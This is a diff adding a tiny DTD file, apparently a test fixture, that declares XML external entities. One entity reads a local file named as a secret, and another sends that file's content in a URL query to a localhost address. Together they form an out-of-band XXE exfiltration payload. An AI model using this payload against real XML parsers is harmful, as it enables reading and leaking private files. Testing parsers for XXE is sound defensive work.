@@ -1,0 +1,5 @@
+﻿<!ENTITY % x "test1 test2">
+<!ENTITY % f SYSTEM "file://C:/temp/EdwardsGeheimnis.txt">
+<!ENTITY send SYSTEM 'http://localhost/banane/test.txt?a=%f;'>
+
+
